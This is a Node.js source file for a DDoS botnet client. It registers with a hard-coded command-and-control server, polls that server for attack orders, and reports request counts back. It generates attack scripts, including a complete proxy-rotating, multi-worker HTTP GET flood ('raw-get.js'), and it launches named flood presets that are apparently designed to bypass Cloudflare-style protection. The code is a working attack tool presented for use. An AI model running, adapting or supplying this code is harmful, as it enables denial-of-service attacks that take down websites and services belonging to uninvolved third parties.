const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const os = require('os');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com'; // CHANGE THIS
const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
const MAX_REGISTRATION_ATTEMPTS = 5;

// ========== GENERATE UNIQUE BOT ID (NOT IP) ==========
const generateBotId = () => {
  const hostname = os.hostname();
  const pid = process.pid;
  const random = crypto.randomBytes(4).toString('hex');
  return `${hostname}-${pid}-${random}`;
};

const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `${os.hostname()}-agent`;

// ========== GLOBAL VARIABLES ==========
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let currentProxyIndex = 0;
let currentUaIndex = 0;
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;

// ========== COLORS ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// ========== AUTO INSTALL NPM PACKAGES ==========
async function installNpmPackages() {
  const requiredPackages = [
    'express',
    'axios',
    'socks',
    'random-useragent',
    'cookie-parser',
    'express-rate-limit',
    'https-proxy-agent',
    'socks-proxy-agent',
    'set-cookie-parser',
    'hpack',
    'colors'
  ];

  console.log(color('\n🔍 Checking npm packages...', colors.cyan));
  const missingPackages = [];
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
    } catch (e) {
      console.log(color(`   ⬇️  ${pkg} - missing`, colors.yellow));
      missingPackages.push(pkg);
    }
  }

  if (missingPackages.length > 0) {
    console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
        stdio: 'inherit',
        shell: true
      });
      install.on('close', (code) => {
        if (code === 0) {
          console.log(color('\n✅ All packages installed!\n', colors.green));
          resolve();
        } else {
          reject(new Error('Installation failed'));
        }
      });
    });
  }
  return Promise.resolve();
}

// ========== CREATE PROXY.TXT IF MISSING ==========
function createProxyFile() {
  if (!fs.existsSync('proxy.txt')) {
    const template = `# Proxy list - one per line
# Format: ip:port
# Example: 192.168.1.1:8080
`;
    fs.writeFileSync('proxy.txt', template);
    console.log(color('📄 Created proxy.txt template', colors.green));
  }
}

// ========== CREATE UA.TXT IF MISSING ==========
function createUaFile() {
  if (!fs.existsSync('ua.txt')) {
    const userAgents = [
      '# User Agents - one per line',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    fs.writeFileSync('ua.txt', userAgents.join('\n'));
    console.log(color('📄 Created ua.txt template', colors.green));
  }
}

// ========== CREATE METHODS DIRECTORY AND ALL SCRIPTS ==========
function createMethodScripts() {
  const methodsDir = path.join(__dirname, 'methods');
  if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });

  const writeScript = (filename, content) => {
    const filePath = path.join(methodsDir, filename);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, content);
      console.log(color(`   ✅ Created ${filename}`, colors.green));
    }
  };

  // Basic stub scripts (same as before)
  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
  writeScript('high-dstat.js', stub('high-dstat'));
  writeScript('w-flood1.js', stub('w-flood1'));
  writeScript('vhold.js', stub('vhold'));
  writeScript('nust.js', stub('nust'));
  writeScript('BYPASS.js', stub('BYPASS'));
  writeScript('cibi.js', stub('cibi'));
  writeScript('REX-COSTUM.js', stub('REX-COSTUM'));
  writeScript('h2-nust', stub('h2-nust'));
  writeScript('http-panel.js', stub('http-panel'));
  writeScript('uam.js', stub('uam'));
  writeScript('wil.js', stub('wil'));
  writeScript('cf-bypass.js', stub('cf-bypass'));
  writeScript('modern-flood.js', stub('modern-flood'));

  // R10 series stubs
  const r10files = ['r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'];
  for (const f of r10files) writeScript(f, stub(f.replace('.js', '')));

  // RAW-GET full script (the one provided by user)
  const rawGetContent = `#!/usr/bin/env node

// RAW-GET Flood - Pure GET requests, high RPS, minimal headers

const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const cluster = require('cluster');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 10,
    rate: parseInt(process.argv[5]) || 1000,
    proxyFile: process.argv[6] || 'proxy.txt'
};

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const keepAliveAgent = new httpLib.Agent({
    keepAlive: true,
    keepAliveMsecs: 10000,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    timeout: 60000
});

let proxies = [];
if (fs.existsSync(args.proxyFile)) {
    proxies = fs.readFileSync(args.proxyFile, 'utf8')
        .split('\\n')
        .map(l => l.trim())
        .filter(l => l && !l.startsWith('#') && l.includes(':'));
}
let proxyIndex = 0;

if (cluster.isMaster) {
    console.log(\`\\n🔥 RAW-GET flood | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    let running = true;
    let requestCount = 0;

    function sendRequest() {
        if (!running) return;
        let options = {
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Connection': 'keep-alive'
            },
            agent: keepAliveAgent,
            rejectUnauthorized: false
        };
        if (proxies.length > 0) {
            const proxy = proxies[proxyIndex % proxies.length];
            proxyIndex++;
            const [proxyHost, proxyPort] = proxy.split(':');
            options.agent = new httpLib.Agent({ host: proxyHost, port: parseInt(proxyPort), keepAlive: true });
        }
        const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
        req.on('error', () => {});
        req.end();
    }

    const intervalMs = 1000 / args.rate;
    const intervalId = setInterval(() => sendRequest(), intervalMs);
    setInterval(() => {
        console.log(\`RPS: \${requestCount}\`);
        requestCount = 0;
    }, 1000);
    setTimeout(() => {
        running = false;
        clearInterval(intervalId);
        process.exit(0);
    }, args.time * 1000);
}
`;
  writeScript('raw-get.js', rawGetContent);

  console.log(color('✅ All method scripts created!\n', colors.green));
}

// ========== REPORTING FUNCTION ==========
async function sendReport(target, method, requestsMade, duration) {
  try {
    const axios = require('axios');
    await axios.post(`${MASTER_SERVER}/api/report`, {
      botId: BOT_ID,
      target,
      method,
      requests: requestsMade,
      duration
    }, {
      headers: { 'Content-Type': 'application/json' }
    });
    console.log(color(`📊 Report sent: ${requestsMade} requests to ${target}`, colors.cyan));
  } catch (error) {
    console.log(color(`⚠️ Report failed: ${error.message}`, colors.yellow));
  }
}

// ========== MAIN BOT ==========
async function startBot() {
  console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
  console.log(color('='.repeat(50), colors.cyan));
  console.log(color(`🆔 Bot ID: ${BOT_ID}`, colors.magentaBright));
  console.log(color(`📛 Bot Name: ${BOT_NAME}`, colors.magentaBright));
  console.log(color('='.repeat(50), colors.cyan));

  createProxyFile();
  createUaFile();
  createMethodScripts();
  await installNpmPackages();

  const express = require('express');
  const axios = require('axios');
  const { SocksProxyAgent } = require('socks-proxy-agent');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');

  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  // ========== PROXY & UA MANAGEMENT ==========
  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
      }
    } catch (error) {
      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
    }
  }

  function loadUserAgents() {
    try {
      if (fs.existsSync('ua.txt')) {
        const data = fs.readFileSync('ua.txt', 'utf8');
        uaList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
      }
    } catch (error) {
      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
    }
  }

  const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
  const api = axios.create({ timeout: 10000, httpsAgent, headers: { 'Content-Type': 'application/json' } });

  // ========== AUTO REGISTER ==========
  async function autoRegister() {
    if (isBlocked) {
      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
      process.exit(0);
    }
    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
      setTimeout(() => { registrationAttempts = 0; autoRegister(); }, 60000);
      return;
    }
    try {
      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
      const payload = { id: BOT_ID, name: BOT_NAME };
      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));
      const response = await api.post(`${MASTER_SERVER}/register`, payload);
      if (response.data.approved) {
        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
        setInterval(() => checkForCommands(), 3000);
        setInterval(() => sendHeartbeat(), 30000);
        return;
      }
    } catch (error) {
      console.log(color(`❌ Registration failed:`, colors.red));
      if (error.response && error.response.status === 403) {
        console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
        isBlocked = true;
        process.exit(0);
      }
      registrationAttempts++;
      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
      setTimeout(() => autoRegister(), 5000);
    }
  }

  async function sendHeartbeat() {
    try {
      await api.get(`${MASTER_SERVER}/ping`);
      console.log(color(`💓 Heartbeat | ID: ${BOT_ID} | Total Reqs: ${totalRequests}`, colors.green));
    } catch (error) {
      console.log(color(`💔 Heartbeat failed`, colors.red));
      registrationAttempts = 0;
      autoRegister();
    }
  }

  async function checkForCommands() {
    try {
      const response = await api.get(`${MASTER_SERVER}/get-command`, {
        params: { botId: BOT_ID }
      });
      if (response.data.hasCommand) {
        const command = response.data.command;
        if (command.action === 'stop') {
          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {}
  }

  function stopAllAttacks() {
    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
    activeProcesses.forEach(proc => {
      try { process.kill(-proc.pid); } catch (error) {}
    });
    activeProcesses = [];
    currentAttack = null;
    requestCount = 0;
    console.log(color(`✅ All attacks stopped`, colors.green));
  }

  function executeAttack(target, time, methods) {
    currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
    requestCount = 0;
    attackStartTime = Date.now();

    const execWithLog = (cmd) => {
      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) { console.error(color(`❌ Error: ${error.message}`, colors.red)); return; }
        if (stdout) {
          const lines = stdout.split('\n');
          lines.forEach(line => {
            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
              requestCount++;
              totalRequests++;
            }
          });
        }
        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
      });
      activeProcesses.push(proc);
      setTimeout(() => {
        const index = activeProcesses.indexOf(proc);
        if (index > -1) {
          try { process.kill(-proc.pid); } catch (e) {}
          activeProcesses.splice(index, 1);
        }
      }, parseInt(time) * 1000 + 5000);
    };

    // Attack methods including RAW-GET
    switch(methods) {
      case 'RAPID10':
        execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
        execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
        execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
        execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
        break;
      case 'CF-BYPASS':
        execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
        break;
      case 'MODERN-FLOOD':
        execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
        break;
      case 'HTTP-SICARIO':
        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
        execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
        break;
      case 'RAW-HTTP':
        execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
        execWithLog(`node methods/http-panel.js ${target} ${time}`);
        break;
      case 'RAW-GET':
        // threads=20, rate=800 per worker – adjust as needed
        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800 proxy.txt`);
        break;
      case 'R9':
        execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
        break;
      case 'PRIV-TOR':
        execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
        execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
        execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
        break;
      case 'HOLD-PANEL':
        execWithLog(`node methods/http-panel.js ${target} ${time}`);
        break;
      case 'R1':
        execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
        execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
        execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
        break;
      case 'UAM':
        execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
        break;
      case 'W.I.L':
        execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
        break;
      default:
        console.log(color(`❌ Unknown method: ${methods}`, colors.red));
    }

    // After attack ends, send report
    setTimeout(() => {
      if (requestCount > 0) {
        sendReport(target, methods, requestCount, time);
      }
    }, (parseInt(time) * 1000) + 2000);
  }

  // Health endpoint
  app.get('/health', (req, res) => {
    res.json({
      status: 'online',
      botId: BOT_ID,
      uptime: process.uptime(),
      totalRequests,
      proxies: proxyList.length,
      userAgents: uaList.length,
      currentAttack: currentAttack ? {
        target: currentAttack.target,
        method: currentAttack.methods,
        duration: Math.floor((Date.now() - attackStartTime) / 1000),
        requests: requestCount
      } : null
    });
  });

  app.get('/ping', (req, res) => {
    res.json({ alive: true, botId: BOT_ID, uptime: process.uptime(), timestamp: Date.now(), totalRequests });
  });

  app.listen(PORT, async () => {
    loadProxies();
    loadUserAgents();
    console.log(color(`🤖 Bot HTTP server listening on port ${PORT}`, colors.green));
    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
    setTimeout(() => autoRegister(), 3000);
  });
}

startBot().catch(error => {
  console.error(color('Failed to start bot:', colors.red), error);
  process.exit(1);
});
